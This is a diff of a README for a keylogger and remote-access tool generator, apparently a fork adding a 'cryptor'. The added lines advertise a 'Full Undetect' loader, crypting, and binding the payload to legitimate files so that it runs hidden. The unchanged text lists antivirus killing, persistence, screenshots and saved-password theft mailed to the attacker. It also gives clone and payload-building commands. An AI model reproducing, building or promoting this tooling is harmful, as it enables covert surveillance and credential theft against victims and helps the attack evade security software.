@@ -36,12 +36,12 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 ## Features
 - [x] Works on Windows/Linux
 - [x] Notify New Victim Via Email
-- [x] Undetectable
+- [x] FUD Loader (Full Undetect)
 - [x] Persistence
 - [x] Sends Screenshot of Victim PC's Screen via email
 - [x] Creates Executable Binary With Zero Dependencies
-- [x] Create less size ~ 5mb payload with advance functionality
-- [x] Obfusticate the Payload before Generating it, hence Bypassing few more antivirus
+- [x] Create less size ~ 15mb payload with advance functionality
+- [x] Obfusticate the Payload before Generating it, hence Bypassing few more antivirus, crypting finished file
 - [x] Generated Payload is Encoded with base64, hence makes extremely difficult to reverse engineer the payload
 - [x] Function to Kill Antivirus on Victim PC and tries to disable the security
 - [x] Awesome Colourful Interface to generate payload
@@ -50,6 +50,7 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 - [x] Able to add custom Icon to evil file
 - [x] **Built-in Binder** which can bind Keylogger to **Any File** [.pdf, .txt, .exe etc], Running legitimate file on front end & evil codes in back-end as a service.
 - [x] Checks for **Already Running Instance** on System, If running instance found, then only legitimate file is executed [**Multiple Instance Prohibiter** to avoid Receiving Duplicate Email Logs].
+- [x] The joyner function, which allows you to run a legitimate program together with a virus.
 - [x] Attacker can Create/Compile for Both **Windows/Linux OS** Using Linux System, But Can only Create/Compile **Windows** Executable using Windows Machine
 - [x] Retrieves Saved Passwords from victim System and sends it to Attacker.
 
@@ -87,6 +88,10 @@ On **30 May 2022**, Google has **removed less secure apps feature**, so instead 
 
 [![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**
 
+[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10 - Pro**
+
+[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10 - Enterprise**
+
 ## Prerequisite
 - [x] Python 3.X
 - [x] Few External Modules
@@ -97,10 +102,10 @@ On **30 May 2022**, Google has **removed less secure apps feature**, so instead 
 $ cd /opt/
 
 # Clone this repository
-$ git clone https://github.com/PushpenderIndia/technowlogger.git
+$ git clone https://github.com/httpshotmaker/technowlogger_with_cryptor.git
 
 # Navigate to technowlogger folder
-$ cd technowlogger
+$ cd technowlogger_with_cryptor
 
 # Installing dependencies
 $ bash installer_linux.sh
@@ -117,7 +122,7 @@ $ chmod +x technowgen.py
 $ python3 technowgen.py --help
 
 # Making Payload/RAT
-$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path -b bind_to_path -j True
 
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
@@ -128,21 +133,19 @@ Note: You can also use our custom icons from the icon folder, just use them like
 $ Install latest python 3.x
 
 # Clone this repository
-$ git clone https://github.com/PushpenderIndia/technowlogger.git
+$ git clone https://github.com/httpshotmaker/technowlogger_with_cryptor.git
 
 # Go into the repository
-$ cd technowlogger
+$ cd technowlogger_with_cryptor
 
 # Installing dependencies
 $ python -m pip install -r requirements.txt
-
-# Open technowgen.py in Text editor and Configure Line 16 WINDOWS_PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe" 
 
 # Getting Help Menu
 $ python technowgen.py --help
 
 # Making Payload/RAT
-$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
+$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path -b bind_to_path -j True
 
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
@@ -174,6 +177,7 @@ Note: You can also use our custom icons from the icon folder, just use them like
 | Short Hand  | Full Hand | Description |
 | ----------  | --------- | ----------- |
 |             | --icon ICON   | Specify Icon Path, Icon of Evil File [**Note : Must Be .ico**] |
+| -b BIND     | --bind FILE   | Specify the path to the legitimate file. |
 | -e EMAIL    | --email EMAIL | Email address to send reports to. |
 | -p PASSWORD | --password PASSWORD | Password for the email address given in the -e argument. |
 | -o OUT      | --out OUT    | Output file name.|
